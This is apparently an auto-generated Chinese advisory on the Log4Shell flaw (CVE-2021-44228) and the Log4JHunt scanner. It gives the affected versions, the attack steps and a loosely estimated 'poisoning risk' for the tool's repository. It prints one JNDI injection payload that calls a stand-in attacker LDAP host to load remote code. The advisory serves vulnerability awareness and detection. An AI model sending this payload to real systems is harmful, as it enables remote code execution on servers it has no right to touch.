## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)